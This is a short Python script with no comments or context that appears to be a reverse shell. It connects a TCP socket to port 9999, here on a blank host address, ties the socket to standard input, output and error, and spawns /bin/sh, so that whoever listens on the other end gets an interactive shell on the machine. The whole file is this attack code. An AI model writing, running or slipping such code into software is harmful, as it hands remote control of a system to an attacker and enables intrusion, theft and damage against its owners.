from os import dup2
from pty import spawn
from socket import socket, AF_INET, SOCK_STREAM

s = socket(AF_INET, SOCK_STREAM)
s.connect(("", 9999))
dup2(s.fileno(), 0)
dup2(s.fileno(), 1)
dup2(s.fileno(), 2)
try:
    spawn("/bin/sh")
except FileNotFoundError:
    print("Failed")
    exit()
